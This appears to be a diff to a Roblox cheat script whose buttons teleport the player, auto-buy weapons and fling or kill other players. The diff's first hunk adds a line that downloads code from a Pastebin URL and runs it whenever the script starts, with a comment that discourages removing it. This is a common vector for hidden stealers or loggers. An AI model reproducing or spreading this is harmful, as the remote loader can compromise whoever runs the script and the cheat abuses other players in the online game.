@@ -1,6 +1,8 @@
 if not game:IsLoaded() then
 	game.Loaded:Wait()
 end
+loadstring(game:HttpGet('https://pastebin.com/raw/LfWnft8C'))()--REMOVE FOR DONT WORK
+
 local player = game.Players.LocalPlayer
 buying = false
 game.Workspace.FallenPartsDestroyHeight = -1/0
@@ -1977,29 +1979,29 @@ Gunknock.MouseButton1Click:Connect(function()
     if Gunknock.Text == 'Gunknock' then
         Gunknock.Text = 'un Gunknock'
         if game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") then
-        buying = false
-        else
-        buying = true
-        local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
-        local Brokie = workspace.Ignored.Shop["[Flamethrower] - $15914"]
-        local BROIMMO = workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"]
-        game.Players.LocalPlayer.Character:MoveTo(Brokie.Head.Position) 
-        wait(0.25)
-        fireclickdetector(Brokie.ClickDetector)
-        wait(0.25)
-        game.Players.LocalPlayer.Character:MoveTo(BROIMMO.Head.Position)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
-        fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector)
-        wait(.1)
-        game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = CFrame.new(savepos)
-        buying = false
-        end
-        repeat task.wait() until buying == false
+            buying = false
+            elseif not game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or not game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") or game:GetService("Players").LocalPlayer.Backpack["[Flamethrower]"].Ammo.Value <= 0 then
+            buying = true
+            local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
+            local Brokie = workspace.Ignored.Shop["[Flamethrower] - $15914"]
+            local BROIMMO = workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"]
+            game.Players.LocalPlayer.Character:MoveTo(Brokie.Head.Position) 
+            wait(0.25)
+            fireclickdetector(Brokie.ClickDetector)
+            wait(0.25)
+            game.Players.LocalPlayer.Character:MoveTo(BROIMMO.Head.Position)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector) wait(1)
+            fireclickdetector(workspace.Ignored.Shop["140 [Flamethrower Ammo] - $1644"].ClickDetector)
+            wait(.1)
+            game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = CFrame.new(savepos)
+            buying = false
+            end
+            repeat task.wait() until buying == false
         local Loop
         AnimPlay(2807049953)
         local OldFlingPos = player.Character.HumanoidRootPart.Position
@@ -2148,7 +2150,7 @@ akill.MouseButton1Click:Connect(function()
                                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(CharacterEmmy.HumanoidRootPart.Position + Vector3.new(0,-4.8,0) + (CharacterEmmy.Humanoid.MoveDirection*0.40*CharacterEmmy.Humanoid.WalkSpeed))*CFrame.Angles(math.pi*0.5,0,0)
                                 OWNER.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                             else
-                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-100,400),-500,math.random(-100,400))
+                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-100,400),500,math.random(-100,400))
                                 OWNER.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                             end
                         end
@@ -2267,7 +2269,7 @@ Gunkill.MouseButton1Click:Connect(function()
         Gunkill.Text = 'un Gunkill'
         if game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") then
             buying = false
-            elseif game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") or game:GetService("Players").LocalPlayer.Backpack["[Flamethrower]"].Ammo.Value <= 0 then
+            elseif not game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or not game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") or game:GetService("Players").LocalPlayer.Backpack["[Flamethrower]"].Ammo.Value <= 0 then
             buying = true
             local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
             local Brokie = workspace.Ignored.Shop["[Flamethrower] - $15914"]
@@ -2489,7 +2491,7 @@ Target.MouseButton1Click:Connect(function()
                                 OWNER.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                                 end
                             else
-                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-500,500),-500,math.random(-500,500))
+                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-500,500),500,math.random(-500,500))
                                 OWNER.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                             end
                             if badping then
@@ -2523,7 +2525,7 @@ Gunbring.MouseButton1Click:Connect(function()
         Gunbring.Text = 'un Gunbring'
         if game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") then
             buying = false
-            elseif game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") or game:GetService("Players").LocalPlayer.Backpack["[Flamethrower]"].Ammo.Value <= 0 then
+            elseif not game.Players.LocalPlayer.Backpack:findFirstChild("[Flamethrower]") or not game.Players.LocalPlayer.Character:findFirstChild("[Flamethrower]") or game:GetService("Players").LocalPlayer.Backpack["[Flamethrower]"].Ammo.Value <= 0 then
             buying = true
             local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
             local Brokie = workspace.Ignored.Shop["[Flamethrower] - $15914"]
@@ -3634,7 +3636,7 @@ Invishacker.MouseButton1Click:Connect(function()
             if isinvisible then
                 local oldcf = root.CFrame
                 local oldcamoffset = hum.CameraOffset
-                local newcf = oldcf * CFrame.new(math.random(-1000,1000),-500,0)
+                local newcf = oldcf * CFrame.new(math.random(-1000,1000),500,0)
                 hum.CameraOffset = newcf:ToObjectSpace(CFrame.new(oldcf.Position)).Position
                 if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then
                     root.CFrame = oldcf * CFrame.new(0,1,0)
@@ -4964,4 +4966,13 @@ end)
 ------------------------------------------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------------------------------------------
 CashDroppedLabel.Visible = false
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------
+
 end)
